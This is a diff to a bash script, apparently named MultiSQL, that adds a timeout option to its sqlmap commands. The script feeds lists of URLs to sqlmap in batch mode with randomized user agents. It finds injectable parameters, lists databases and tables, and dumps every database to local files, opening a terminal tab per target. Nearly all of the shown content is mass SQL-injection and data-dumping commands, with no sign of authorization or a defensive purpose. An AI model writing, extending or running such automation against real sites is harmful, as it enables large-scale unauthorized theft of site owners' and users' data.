@@ -1,6 +1,6 @@
 #!/bin/bash
 ##Settings#
-vn=2.3
+vn=2.4
 
 
 function versioncheck () {
@@ -173,11 +173,11 @@ echo "Resuming injection at:"
 tput rmso;
 echo $resumeurl
 echo
-echo "sqlmap --random-agent -o --batch --output-dir=~/MultiSQL/Dump/ --no-cast --exclude-sysdb --tables -u '"$resumeurl"'"
+echo "sqlmap --timeout 30 --random-agent -o --batch --output-dir=~/MultiSQL/Dump/ --no-cast --exclude-sysdb --tables -u '"$resumeurl"'"
 echo
 echo
 sleep 5
-sqlmap --random-agent -o --batch --output-dir=~/MultiSQL/Dump/ --no-cast --exclude-sysdb --tables -u ""$resumeurl""
+sqlmap --random-agent --timeout 30 -o --batch --output-dir=~/MultiSQL/Dump/ --no-cast --exclude-sysdb --tables -u ""$resumeurl""
 exit 0
 }
 
@@ -249,7 +249,7 @@ function multi (){
   while IFS= read -r url; do
     echo "Using: $url"
     echo
-    unbuffer sqlmap --random-agent --smart --batch --output-dir=~/MultiSQL/Dump/ --threads 3 --dbs -u "$url" | tee lsql.log
+    unbuffer sqlmap --timeout 30 --random-agent --smart --batch --output-dir=~/MultiSQL/Dump/ --threads 3 --dbs -u "$url" | tee lsql.log
     echo
     if  grep -q "back-end DBMS:" lsql.log; then
     now=$(date)
@@ -296,7 +296,7 @@ function multi (){
   tput rmso;
   sleep 3
   while IFS= read -r url; do
-  gnome-terminal --tab -- bash -c "sqlmap --random-agent -o --output-dir=~/MultiSQL/Dump/ --batch --no-cast --exclude-sysdb --dump-all --dump-format sqlite -u ""$url""" &>/dev/null
+  gnome-terminal --tab -- bash -c "sqlmap --timeout 30 --random-agent -o --output-dir=~/MultiSQL/Dump/ --batch --no-cast --exclude-sysdb --dump-all --dump-format sqlite -u ""$url""" &>/dev/null
   done < ".msql.dump"
   rm -f .msql.dump
   exit 0
@@ -394,14 +394,14 @@ read -r extra
 
 ##Scan url##
 function confirmation (){
-  unbuffer sqlmap --random-agent --batch --output-dir=~/MultiSQL/Dump/ --threads "$Threads" --dbs -u "$url" $extra | tee lsql.log
+  unbuffer sqlmap --timeout 30 --random-agent --batch --output-dir=~/MultiSQL/Dump/ --threads "$Threads" --dbs -u "$url" $extra | tee lsql.log
 
   echo
   echo
   tput smso;
   echo "Used command:"
   tput rmso;
-  echo "sqlmap --random-agent --batch --output-dir=~/MultiSQL/Dump/ --threads '"$Threads"' --dbs -u '"$url"' "$extra""
+  echo "sqlmap --timeout 30 --random-agent --batch --output-dir=~/MultiSQL/Dump/ --threads '"$Threads"' --dbs -u '"$url"' "$extra""
   echo
   echo "Link:"
   echo $url
@@ -422,10 +422,10 @@ function confirmation (){
   echo
   echo "Injection found, next command:"
   tput rmso;
-  echo "sqlmap --random-agent -o --batch --output-dir=~/MultiSQL/Dump/ --no-cast --exclude-sysdb --tables -u '"$url"'"
+  echo "sqlmap --timeout 30 --random-agent -o --batch --output-dir=~/MultiSQL/Dump/ --no-cast --exclude-sysdb --tables -u '"$url"'"
   echo
   echo
-  sqlmap --random-agent -o --batch --output-dir=~/MultiSQL/Dump/ --no-cast --exclude-sysdb --tables -u ""$url""
+  sqlmap --timeout 30 --random-agent -o --batch --output-dir=~/MultiSQL/Dump/ --no-cast --exclude-sysdb --tables -u ""$url""
   else
   echo
   echo "$url" >> /.lsql.no
